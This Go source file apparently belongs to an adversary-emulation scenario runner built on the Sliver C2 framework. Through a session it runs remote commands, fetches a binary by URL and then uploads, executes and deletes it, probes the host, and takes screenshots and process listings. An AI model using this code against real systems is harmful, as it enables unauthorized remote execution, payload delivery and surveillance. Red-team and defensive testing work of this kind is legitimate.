package sliver

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/scenario/chain"
)

// Executor dispatches chain step actions to a remote Sliver session via gRPC.
// It implements chain.StepExecutor.
type Executor struct {
	rpc     rpcpb.SliverRPCClient
	cfgPath string // path to the Sliver operator .cfg file; injected into python steps
}

// NewExecutor creates an Executor backed by an established Sliver RPC client.
// cfgPath is the operator config file path forwarded to Python steps as SLIVER_CONFIG.
func NewExecutor(rpc rpcpb.SliverRPCClient, cfgPath string) *Executor {
	return &Executor{rpc: rpc, cfgPath: cfgPath}
}

// Execute dispatches a single action and returns stdout, stderr, exit code, and any transport error.
func (e *Executor) Execute(ctx context.Context, sessionID string, action chain.Action) (stdout, stderr string, exitCode int, err error) {
	switch action.Type {
	case chain.ActionCommand:
		return e.execCommand(ctx, sessionID, action.Command)
	case chain.ActionUpload:
		return e.execUpload(ctx, sessionID, action.Upload)
	case chain.ActionBinary:
		return e.execBinary(ctx, sessionID, action.Binary)
	case chain.ActionProbe:
		return e.execProbe(ctx, sessionID, action.Probe)
	case chain.ActionPython:
		return e.execPython(ctx, sessionID, action.Python)
	case chain.ActionSliverRPC:
		return e.execRPC(ctx, sessionID, action.RPCAction)
	default:
		return "", "", 1, fmt.Errorf("executor received unresolved action type %q (should be pre-resolved by chain executor)", action.Type)
	}
}

// execCommand runs a shell/powershell/cmd command on the remote session.
func (e *Executor) execCommand(ctx context.Context, sessionID string, cmd *chain.CommandAction) (string, string, int, error) {
	if cmd == nil {
		return "", "", 1, fmt.Errorf("nil command action")
	}

	path, args := buildArgs(cmd.Interpreter, cmd.Cmd)

	resp, err := e.rpc.Execute(ctx, &sliverpb.ExecuteReq{
		Path:    path,
		Args:    args,
		Output:  true,
		Request: reqFor(sessionID),
	})
	if err != nil {
		return "", "", 1, fmt.Errorf("Execute RPC: %w", err)
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return string(resp.Stdout), string(resp.Stderr), int(resp.Status),
			fmt.Errorf("remote error: %s", resp.Response.Err)
	}
	return string(resp.Stdout), string(resp.Stderr), int(resp.Status), nil
}

// execUpload transfers a local file to the remote host and optionally executes it.
func (e *Executor) execUpload(ctx context.Context, sessionID string, up *chain.UploadAction) (string, string, int, error) {
	if up == nil {
		return "", "", 1, fmt.Errorf("nil upload action")
	}
	data, err := os.ReadFile(up.LocalPath)
	if err != nil {
		return "", "", 1, fmt.Errorf("reading %q for upload: %w", up.LocalPath, err)
	}

	_, err = e.rpc.Upload(ctx, &sliverpb.UploadReq{
		Path:    up.RemotePath,
		Data:    data,
		Request: reqFor(sessionID),
	})
	if err != nil {
		return "", "", 1, fmt.Errorf("Upload RPC: %w", err)
	}

	if up.Execute {
		execCmd := &chain.CommandAction{
			Interpreter: "sh",
			Cmd:         fmt.Sprintf("chmod +x %s && %s", up.RemotePath, up.RemotePath),
		}
		return e.execCommand(ctx, sessionID, execCmd)
	}
	return fmt.Sprintf("uploaded %d bytes to %s", len(data), up.RemotePath), "", 0, nil
}

// execBinary fetches a binary (from embedded base64 data or a URL), uploads it to the
// victim session, executes it, and optionally removes it afterwards.
func (e *Executor) execBinary(ctx context.Context, sessionID string, bin *chain.BinaryAction) (string, string, int, error) {
	if bin == nil {
		return "", "", 1, fmt.Errorf("nil binary action")
	}

	// ── 1. Obtain the binary bytes ──────────────────────────────────────────
	var data []byte
	switch {
	case bin.Data != "":
		var err error
		data, err = base64.StdEncoding.DecodeString(bin.Data)
		if err != nil {
			return "", "", 1, fmt.Errorf("decoding binary data: %w", err)
		}
	case bin.URL != "":
		var err error
		data, err = downloadBinary(ctx, bin.URL)
		if err != nil {
			return "", "", 1, fmt.Errorf("downloading binary from %q: %w", bin.URL, err)
		}
	default:
		return "", "", 1, fmt.Errorf("binary action requires either 'data' (base64) or 'url'")
	}

	// ── 2. Determine platform and remote path ───────────────────────────────
	platform := strings.ToLower(bin.Platform)
	if platform == "" {
		platform = "linux"
	}

	remotePath := bin.RemotePath
	if remotePath == "" {
		suffix := time.Now().UnixNano()
		switch platform {
		case "windows":
			remotePath = fmt.Sprintf(`C:\Windows\Temp\scn_%d.exe`, suffix)
		default:
			remotePath = fmt.Sprintf("/tmp/scn_%d", suffix)
		}
	}

	// ── 3. Upload to victim ─────────────────────────────────────────────────
	_, err := e.rpc.Upload(ctx, &sliverpb.UploadReq{
		Path:    remotePath,
		Data:    data,
		Request: reqFor(sessionID),
	})
	if err != nil {
		return "", "", 1, fmt.Errorf("Upload RPC for binary: %w", err)
	}

	// ── 4. Execute ──────────────────────────────────────────────────────────
	var execCmd *chain.CommandAction
	switch platform {
	case "windows":
		cmd := remotePath
		if bin.Args != "" {
			cmd += " " + bin.Args
		}
		execCmd = &chain.CommandAction{Interpreter: "cmd", Cmd: cmd}
	default:
		cmd := fmt.Sprintf("chmod +x %s && %s", remotePath, remotePath)
		if bin.Args != "" {
			cmd += " " + bin.Args
		}
		execCmd = &chain.CommandAction{Interpreter: "sh", Cmd: cmd}
	}

	stdout, stderr, exitCode, execErr := e.execCommand(ctx, sessionID, execCmd)

	// ── 5. Cleanup (best-effort, do not override execution error) ──────────
	if bin.Cleanup {
		var cleanCmd *chain.CommandAction
		switch platform {
		case "windows":
			cleanCmd = &chain.CommandAction{Interpreter: "cmd", Cmd: fmt.Sprintf("del /f /q %s", remotePath)}
		default:
			cleanCmd = &chain.CommandAction{Interpreter: "sh", Cmd: fmt.Sprintf("rm -f %s", remotePath)}
		}
		_, _, _, _ = e.execCommand(ctx, sessionID, cleanCmd)
	}

	return stdout, stderr, exitCode, execErr
}

// downloadBinary performs an HTTP GET and returns the response body.
// The context controls the request lifetime.
func downloadBinary(ctx context.Context, url string) ([]byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("HTTP %s", resp.Status)
	}
	return io.ReadAll(resp.Body)
}

// execProbe interrogates the victim's environment by running a platform-appropriate
// detection command via Sliver and optionally validates the output against a regex.
//
// Probe kinds and their underlying commands:
//
//	os               → uname -s  /  wmic os get Caption
//	kernel           → uname -r  /  wmic os get Version
//	arch             → uname -m  /  wmic os get OSArchitecture
//	software_exists  → which <software>  /  where <software>
//	software_version → <software> --version 2>&1  (tries multiple flag styles on Linux)
func (e *Executor) execProbe(ctx context.Context, sessionID string, probe *chain.ProbeAction) (string, string, int, error) {
	if probe == nil {
		return "", "", 1, fmt.Errorf("nil probe action")
	}

	platform := strings.ToLower(probe.Platform)
	if platform == "" {
		platform = "linux"
	}

	var cmd *chain.CommandAction
	switch strings.ToLower(probe.Kind) {
	case "os":
		switch platform {
		case "windows":
			cmd = &chain.CommandAction{Interpreter: "cmd", Cmd: `wmic os get Caption /value`}
		default:
			cmd = &chain.CommandAction{Interpreter: "sh", Cmd: "uname -s"}
		}
	case "kernel":
		switch platform {
		case "windows":
			cmd = &chain.CommandAction{Interpreter: "cmd", Cmd: `wmic os get Version /value`}
		default:
			cmd = &chain.CommandAction{Interpreter: "sh", Cmd: "uname -r"}
		}
	case "arch":
		switch platform {
		case "windows":
			cmd = &chain.CommandAction{Interpreter: "cmd", Cmd: `wmic os get OSArchitecture /value`}
		default:
			cmd = &chain.CommandAction{Interpreter: "sh", Cmd: "uname -m"}
		}
	case "software_exists":
		if probe.Software == "" {
			return "", "", 1, fmt.Errorf("probe kind software_exists requires 'software' field")
		}
		switch platform {
		case "windows":
			cmd = &chain.CommandAction{Interpreter: "cmd", Cmd: fmt.Sprintf("where %s", probe.Software)}
		default:
			cmd = &chain.CommandAction{Interpreter: "sh", Cmd: fmt.Sprintf("which %s", probe.Software)}
		}
	case "software_version":
		if probe.Software == "" {
			return "", "", 1, fmt.Errorf("probe kind software_version requires 'software' field")
		}
		switch platform {
		case "windows":
			cmd = &chain.CommandAction{Interpreter: "cmd", Cmd: fmt.Sprintf("%s --version 2>&1", probe.Software)}
		default:
			// Try the three most common version flag styles in order.
			cmd = &chain.CommandAction{
				Interpreter: "sh",
				Cmd: fmt.Sprintf(
					"%s --version 2>&1 || %s -version 2>&1 || %s version 2>&1",
					probe.Software, probe.Software, probe.Software,
				),
			}
		}
	default:
		return "", "", 1, fmt.Errorf("unknown probe kind %q (valid: os, kernel, arch, software_exists, software_version)", probe.Kind)
	}

	stdout, stderr, exitCode, err := e.execCommand(ctx, sessionID, cmd)
	if err != nil || exitCode != 0 {
		return stdout, stderr, exitCode, err
	}

	// No match pattern — discovery-only mode, always succeed.
	if probe.Match == "" {
		return stdout, stderr, 0, nil
	}

	re, compileErr := regexp.Compile(probe.Match)
	if compileErr != nil {
		return stdout, stderr, 1, fmt.Errorf("invalid probe match regex %q: %w", probe.Match, compileErr)
	}
	if re.MatchString(stdout) {
		return stdout, stderr, 0, nil // matched → success
	}
	return stdout, stderr, 1, nil // no match → failure (triggers on_fail policy)
}

// execPython runs a Python 3 script on the C2 server (not on the victim).
// The script receives SLIVER_CONFIG and SESSION_ID as environment variables so it
// can establish its own sliver-py connection and perform arbitrary Sliver operations.
// Additional variables can be forwarded via the Env map (supports {{VarName}} substitution).
func (e *Executor) execPython(ctx context.Context, sessionID string, py *chain.PythonAction) (string, string, int, error) {
	if py == nil {
		return "", "", 1, fmt.Errorf("nil python action")
	}

	scriptPath := py.Script
	if py.Inline != "" {
		f, err := os.CreateTemp("", "scenario_*.py")
		if err != nil {
			return "", "", 1, fmt.Errorf("creating temp script file: %w", err)
		}
		defer os.Remove(f.Name())
		if _, err := f.WriteString(py.Inline); err != nil {
			f.Close()
			return "", "", 1, fmt.Errorf("writing inline script: %w", err)
		}
		if err := f.Close(); err != nil {
			return "", "", 1, fmt.Errorf("closing temp script: %w", err)
		}
		scriptPath = f.Name()
	}

	if scriptPath == "" {
		return "", "", 1, fmt.Errorf("python action requires either 'script' (file path) or 'inline'")
	}

	args := append([]string{scriptPath}, py.Args...)
	cmd := exec.CommandContext(ctx, "python3", args...)

	// Inject built-in context variables and caller-supplied env.
	cmd.Env = append(os.Environ(),
		"SLIVER_CONFIG="+e.cfgPath,
		"SESSION_ID="+sessionID,
	)
	for k, v := range py.Env {
		cmd.Env = append(cmd.Env, k+"="+v)
	}

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	runErr := cmd.Run()
	exitCode := 0
	if runErr != nil {
		var exitErr *exec.ExitError
		if errors.As(runErr, &exitErr) {
			exitCode = exitErr.ExitCode()
			runErr = nil // non-zero exit is a step failure, not a transport error
		}
	}
	return stdoutBuf.String(), stderrBuf.String(), exitCode, runErr
}

// execRPC dispatches a named Sliver RPC call.  Only a curated subset is exposed for safety.
func (e *Executor) execRPC(ctx context.Context, sessionID string, rpcAct *chain.RPCAction) (string, string, int, error) {
	if rpcAct == nil {
		return "", "", 1, fmt.Errorf("nil rpc action")
	}
	switch rpcAct.Method {
	case "Ps":
		resp, err := e.rpc.Ps(ctx, &sliverpb.PsReq{Request: reqFor(sessionID)})
		if err != nil {
			return "", "", 1, fmt.Errorf("Ps RPC: %w", err)
		}
		lines := make([]string, 0, len(resp.Processes))
		for _, p := range resp.Processes {
			lines = append(lines, fmt.Sprintf("%d\t%s\t%s", p.Pid, p.Executable, p.Owner))
		}
		return strings.Join(lines, "\n"), "", 0, nil

	case "Screenshot":
		resp, err := e.rpc.Screenshot(ctx, &sliverpb.ScreenshotReq{Request: reqFor(sessionID)})
		if err != nil {
			return "", "", 1, fmt.Errorf("Screenshot RPC: %w", err)
		}
		return fmt.Sprintf("[screenshot captured %d bytes]", len(resp.Data)), "", 0, nil

	case "Ifconfig":
		resp, err := e.rpc.Ifconfig(ctx, &sliverpb.IfconfigReq{Request: reqFor(sessionID)})
		if err != nil {
			return "", "", 1, fmt.Errorf("Ifconfig RPC: %w", err)
		}
		var sb strings.Builder
		for _, iface := range resp.NetInterfaces {
			sb.WriteString(fmt.Sprintf("%s: %s\n", iface.Name, strings.Join(iface.IPAddresses, ", ")))
		}
		return sb.String(), "", 0, nil

	case "Netstat":
		resp, err := e.rpc.Netstat(ctx, &sliverpb.NetstatReq{
			TCP:     true,
			UDP:     true,
			Listening: true,
			Request: reqFor(sessionID),
		})
		if err != nil {
			return "", "", 1, fmt.Errorf("Netstat RPC: %w", err)
		}
		var sb strings.Builder
		for _, entry := range resp.Entries {
			sb.WriteString(fmt.Sprintf("%s %s -> %s [%s]\n",
				entry.Protocol,
				entry.LocalAddr.Ip,
				entry.RemoteAddr.Ip,
				entry.SkState,
			))
		}
		return sb.String(), "", 0, nil

	default:
		return "", "", 1, fmt.Errorf("unsupported sliver_rpc method %q; supported: Ps, Screenshot, Ifconfig, Netstat", rpcAct.Method)
	}
}

// reqFor builds a commonpb.Request with the given session ID.
func reqFor(sessionID string) *commonpb.Request {
	return &commonpb.Request{SessionID: sessionID}
}

// buildArgs constructs the executable path and argument list for the given interpreter.
func buildArgs(interpreter, cmd string) (path string, args []string) {
	switch strings.ToLower(interpreter) {
	case "powershell", "ps":
		return "powershell.exe", []string{"-NonInteractive", "-NoProfile", "-Command", cmd}
	case "cmd":
		return "cmd.exe", []string{"/C", cmd}
	case "bash":
		return "/bin/bash", []string{"-c", cmd}
	default: // "sh", ""
		return "/bin/sh", []string{"-c", cmd}
	}
}
